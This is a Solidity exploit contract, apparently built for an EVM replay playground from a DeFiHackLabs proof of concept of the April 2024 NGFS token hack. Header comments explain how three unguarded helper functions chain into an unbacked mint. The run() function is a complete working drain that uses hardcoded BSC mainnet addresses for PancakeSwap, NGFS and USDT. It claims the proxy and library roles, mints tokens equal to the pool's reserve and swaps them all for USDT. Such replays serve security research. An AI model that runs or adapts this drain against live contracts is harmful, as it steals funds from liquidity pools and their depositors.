// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// Synthetic standalone exploit for the EVM Playground (2024-04-NGFS).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test contract
// (NGFS IS the caller of every step: address(this) walks the privilege-escalation
// chain, holds the minted tokens, approves the router, and receives the swap
// proceeds) — there is no standalone exploit contract to deploy. This contract is a
// faithful, self-contained copy of that inline attack (run() mirrors testExploit())
// so the playground can deploy it and record run(). Logic and constants are copied
// verbatim from evm-hack-registry/2024-04-NGFS_exp/test/NGFS_exp.sol.
//
// Root cause: NGFSToken ships three permissionless "uniswap proxy / reserve sync"
// helper functions that chain into a free privilege escalation:
//   1. delegateCallReserves() — guarded only by a one-time latch that was still
//      unset on-chain — lets the FIRST caller become `_uniswapV2Proxy`.
//   2. setProxySync(addr) — guarded by `msg.sender == _uniswapV2Proxy` (now the
//      attacker) — lets the attacker set `_uniswapV2Library` to itself.
//   3. reserveMultiSync(addr, amount) — guarded by `msg.sender == _uniswapV2Library`
//      (now the attacker) — directly credits `_balances[addr] += amount` with NO
//      totalSupply accounting and no Transfer event (an uncollateralized mint).
// The attacker mints itself an amount of NGFS exactly equal to the NGFS/USDT pair's
// own NGFS reserve, then sells the entire bag through PancakeSwap, draining USDT out
// of the pool.

interface IPancakeFactory {
    function getPair(address, address) external returns (address);
}

interface IPancakeRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface INGFSToken {
    function delegateCallReserves() external;
    function setProxySync(address) external;
    function balanceOf(address) external view returns (uint256);
    function reserveMultiSync(address, uint256) external;
    function approve(address, uint256) external returns (bool);
}

interface IBEP20 {
    function balanceOf(address) external view returns (uint256);
}

contract NGFSDrain {
    address constant PANCAKE_FACTORY = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;
    address constant PANCAKE_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address constant NGFS_TOKEN = 0xa608985f5b40CDf6862bEC775207f84280a91E3A;
    address constant USDT_TOKEN = 0x55d398326f99059fF775485246999027B3197955;

    function run() external {
        address pair = IPancakeFactory(PANCAKE_FACTORY).getPair(NGFS_TOKEN, USDT_TOKEN);
        INGFSToken(NGFS_TOKEN).delegateCallReserves();
        INGFSToken(NGFS_TOKEN).setProxySync(address(this));

        uint256 balance = INGFSToken(NGFS_TOKEN).balanceOf(pair);
        INGFSToken(NGFS_TOKEN).reserveMultiSync(address(this), balance);

        uint256 amount = INGFSToken(NGFS_TOKEN).balanceOf(address(this));
        INGFSToken(NGFS_TOKEN).approve(PANCAKE_ROUTER, type(uint256).max);

        address[] memory path = new address[](2);
        path[0] = NGFS_TOKEN;
        path[1] = USDT_TOKEN;

        uint256 deadline = 1_714_043_885;
        IPancakeRouter(PANCAKE_ROUTER).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount, 0, path, address(this), deadline
        );
    }
}
